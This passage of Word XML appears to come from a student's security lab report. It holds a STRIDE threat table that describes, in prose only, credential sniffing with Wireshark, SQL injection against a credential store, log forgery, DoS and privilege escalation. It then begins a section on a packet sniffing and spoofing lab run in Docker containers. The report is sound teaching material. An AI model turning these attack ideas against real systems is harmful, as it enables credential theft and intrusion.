      <w:tr w:rsidR="00863FF2" w:rsidRPr="00C2328F" w14:paraId="7BA8370C" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55A216D8" w14:textId="1E3CBAEE" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Spoofing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4653497D" w14:textId="7001FB0F" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Impersonate someone</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="04372545" w14:textId="16B110E4" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>The attacker can sniff packets using Wireshark to gain admin authentication credentials if the connection is not secure and pretend to be Admin.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="529D67E9" w14:textId="62F52197" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Application server and Admin.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00863FF2" w:rsidRPr="00C2328F" w14:paraId="1F24FA52" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7F54CCA7" w14:textId="2C6713E4" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Tampering</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="733C2843" w14:textId="33747B9C" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Modify data/system</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65E18D72" w14:textId="01B80B1F" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>The attacker can attack monitoring systems to forge logs and information through the application server.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18FC390A" w14:textId="02510B4F" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Application Server and Monitoring System.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00863FF2" w:rsidRPr="00C2328F" w14:paraId="6517C90F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68A3CC6A" w14:textId="2BF5D64E" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Repudiation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EE5FA49" w14:textId="54CC1513" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Deny actions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="07BFC56C" w14:textId="60D2A9E2" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">The attacker can </w:t>
            </w:r>
            <w:r w:rsidR="00722930" w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>attack authentication credential store through SQL injections and delete sensitive info. Leading to the system not providing access to deleted users</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6305804C" w14:textId="6FF8C6BF" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00722930" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>User, Web Server, Application Server, Authentication Credential Store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00863FF2" w:rsidRPr="00C2328F" w14:paraId="308B4EF8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C894267" w14:textId="7416936E" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Information Disclosure</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18C55039" w14:textId="6FC0FF0B" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Expose sensitive data</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64A35646" w14:textId="6CE4EC83" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00722930" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>The attacker can find vulnerable form that they can inject error-based SQL injection to the web server interacting with the authentication database revealing sensitive data like data schema.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6931A4C7" w14:textId="23BB0FFA" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00722930" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>User, Web Server, Application Server, Authentication Credential Store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00863FF2" w:rsidRPr="00C2328F" w14:paraId="37D975D9" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B61506A" w14:textId="1BBB9CF7" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Denial of service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0F56E7EC" w14:textId="1C24C9A4" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Denying service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="140C147D" w14:textId="761189D1" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00722930" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>The attacker can create a DoS attack that requires small requests but create large resource intensive responses to bring the web server down.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E7ACB64" w14:textId="3DACDDE6" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00722930" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>User, Web Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008F333D" w:rsidRPr="00C2328F" w14:paraId="729762FE" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C8ADA5A" w14:textId="56AEFAE0" w:rsidR="008F333D" w:rsidRPr="00C2328F" w:rsidRDefault="008F333D" w:rsidP="008F333D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Elevation of privilege</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65E78456" w14:textId="41AABF01" w:rsidR="008F333D" w:rsidRPr="00C2328F" w:rsidRDefault="008F333D" w:rsidP="008F333D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Gain higher privilege of the system</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7DCCC8AE" w14:textId="745FDD17" w:rsidR="008F333D" w:rsidRPr="00C2328F" w:rsidRDefault="008F333D" w:rsidP="008F333D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>The attacker can use the web server to attack the application server API and the authentication credential store to gain admin access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="343BBB90" w14:textId="6C5A09B2" w:rsidR="008F333D" w:rsidRPr="00C2328F" w:rsidRDefault="008F333D" w:rsidP="008F333D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>User, Web Server, Application Server, Authentication Credential Store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C6245E9" w14:textId="77777777" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C76A5DC" w14:textId="77777777" w:rsidR="000B681D" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="000B681D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73D7F9D0" w14:textId="77777777" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Section 3: Packet Sniffing and Spoofing Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F9E933" w14:textId="616ED46B" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1DDC736E" wp14:editId="7A13405B">
            <wp:extent cx="5486400" cy="1461135"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="3731282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28274" name="Picture 1" descr="A screenshot of a computer program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1461135"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig1:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Extracted contents of Labsetup-sniffing.zip in home directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74552461" w14:textId="77777777" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03220548" w14:textId="15008E70" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Download the zip files on canvas then share the download folder between your computer and the VM then types the command above in terminal to unzip it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9032BD" w14:textId="1D6C5342" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FC2D35B" wp14:editId="46774CAB">
            <wp:extent cx="5486400" cy="3117850"/>
            <wp:effectExtent l="0" t="0" r="0" b="6350"/>
            <wp:docPr id="127962783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27835" name="Picture 1" descr="A screenshot of a computer program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="3117850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F430522" w14:textId="38A6E41C" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig2: Docker containers for sniffing lab running</w:t>
      </w:r>
    </w:p>
